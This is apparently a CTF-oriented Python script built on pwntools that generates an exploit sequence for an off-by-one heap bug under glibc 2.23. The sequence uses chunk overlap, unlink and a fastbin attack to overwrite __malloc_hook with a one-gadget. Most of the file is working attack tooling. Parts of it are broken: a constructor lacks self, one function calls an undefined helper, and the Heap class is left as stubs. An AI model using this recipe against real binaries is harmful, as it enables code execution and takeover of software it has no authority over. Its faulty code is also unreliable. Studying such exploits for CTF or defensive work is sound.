#coding:utf-8
from pwn import *
from sys import exit


class Heap(object):
    class Chunk(object):
        def __init__(addr, size, fd, bk):
            self.addr = addr
            self.size = size
            self.fd = fd
            self.bk = bk
    
    def __init__(self, base=0x40000, ):
        self.base = base
        self.us_bin = []
        self.fast_bins = [[] for i in range(2, 9)]
        self.small_bins = [[]]
        # return super().__init__(*args, **kwargs)
    
    def _is_fast(self, size):
        return True if size<=0x80 else False
    def _fast_size2idx(self, size):
        # ceiling to 0x10
        idx = ((size + 0xf)/0x10)
        if not is_fast(idx * 0x10):
            log.error("wrong fast size for fast_size2idx() : " + str(size))
            exit(-1)
        return idx-2

    def malloc(self, size):
        pass
    
    def free(self, ptr):
        pass
    
    def calloc(self, ptr):
        pass
        


# assume has add, delete and show methods
# read add have off-by-one vuln
class OffByOne(object):
    """
    arch = amd64
    libc version = 2.23
    """
    def __init__(self):
        self.operations = []
    def set_add(self, const_size, var_range, vuln_idx):
        """
        init the behavior off add method

        Args:
            size must align to 16 !
            assume const_size malloced before var_size
            const_size: the const size of CHUNK malloc memeory each time
                add method is called. can be zero
            var_range: the range of user controlable CHUNK size malloced
            vuln_idx: the off-by-one vuln in which area. must be 0 or 1
                0 --- const_size mem
                1 --- var_size mem
        """
        if vuln_idx != 0 and vuln_idx != 1:
            log.error("wrong vuln_idx : "+str(vuln_idx))
            exit(-1)
        if const_size > 0x80 or const_size==0x70:
            log.error("unsupported const_size(too large) : " + str(const_size))
            exit(-1)
        if var_range[0] > 0x70 or var_range[1] < 0x90:
            log.error("unsupported var_range : " + str(var_range))
            exit(-1)
        self.add_const_size = const_size
        self.add_var_range = var_range
        self.vuln_idx = vuln_idx

    def show_ops(self):
        for op in self.operations:
            print(op) 
    # def set_delete
    def get_exp(self):
        used_idxs = []
        # self.operations = []
        def next_idx():
            for i in range(0, 1000):
                if i in used_idxs:
                    continue
                used_idxs.append(i)
                return i
            raise Exception("no more malloc")
        def op_add(size, content):
            idx = next_idx()
            self.operations.append("add(%d, %s, %s)"%(idx, hex(size), content))
            return idx
        def op_del(idx):
            used_idxs.remove(idx)
            self.operations.append("delete(%d)"%(idx))
        self.operations.append("# you should leak libc first\n")
        if self.vuln_idx == 1:
        # prepare chunks
            if self.add_const_size != 0:
                t1 = op_add(self.add_const_size-8, 'aaa')
                t2 = op_add(self.add_const_size-8, 'aaa')
                t3 = op_add(self.add_const_size-8, 'aaa')
                op_del(t1)
                op_del(t2)
                op_del(t3)
                self.operations.append("# now const_size fastbin have 6 chunks\n")
            a = op_add(0x100-8, '"aaa"')
            b = op_add(0x70-8, '"bbb"')
            c = op_add(0x100-8, '"ccc"')
            d = op_add(0x70-8, '"ddd"')
            op_del(a)
            op_del(b)
            self.operations.append("\n# off-by-one")
            b = op_add(0x70-8, "'a'*0x60 + p64("+hex(0x170)+")")
            self.operations.append("\n# unlink")
            op_del(c)
            self.operations.append("\n# overlap")
            a = op_add(0x100-8, '"aaa"')
            e = op_add(0x70-8, '"eee"')
            self.operations.append("\n# now %d and %d pointer to same addr"%(b, e))
            self.operations.append("\n# fastbin attack")
            op_del(b)
            op_del(d)
            op_del(e)
            self.operations.append("\n# you should check the fast bin :P")
            self.operations.append("fake2 = libc.symbols['__malloc_hook'] - 0x23 # malloc hook ")
            self.operations.append("payload = \"a\"*19 + p64(one)")
            x = op_add(0x70-8, "p64(fake2)")
            y = op_add(0x70-8, "p64(fake2)")
            z = op_add(0x70-8, "payload")
            k = op_add(0x70-8, "payload") 
            self.operations.append("\n# check the malloc :P\np __malloc_hook")
            self.operations.append("# the modify some offset or try realloc and malloc")
        else:
            log.info("not implemented yet")
            exit(-1)

        return self.operations
        # leak libc
        # off-by-one 
        # unlink
        # overlap chunk

def test():
    obo = OffByOne()
    obo.set_add(0x40, [0x20, 0x400], 1)
    exp = obo.get_exp()
    obo.show_ops()
    
test()